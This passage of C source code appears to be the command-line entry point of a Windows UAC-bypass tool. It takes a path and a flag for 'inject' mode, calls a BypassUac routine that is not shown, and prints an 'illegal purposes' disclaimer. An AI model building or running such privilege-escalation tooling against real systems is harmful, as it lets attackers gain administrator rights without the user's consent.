	printf("The number 0 means to with inject\r\n");
	printf("The number 1 means to without inject\r\n");
	SetConsoleTextAttribute(handle, 5);
	printf("Do not use for illegal purposes, or author is not responsible for the consequences!\r\n");
}
			
int _tmain(int argc, _TCHAR* argv[])
{		
	if (argc != 3)
	{	
		Help();
		return 0;
	}

	if (_tcslen(argv[1]) >= 256)
	{
		Help();
		printf("The path must be less than 256.\r\n");
		return 0;
	}
	
	DWORD dwIndex = StrToInt(argv[2]);
	if (dwIndex != 0 && dwIndex != 1)
	{
		Help();
		printf("The second parameter invaild.\r\n");
		return 0;
	}
	
	BypassUac(argv[1], dwIndex);
}

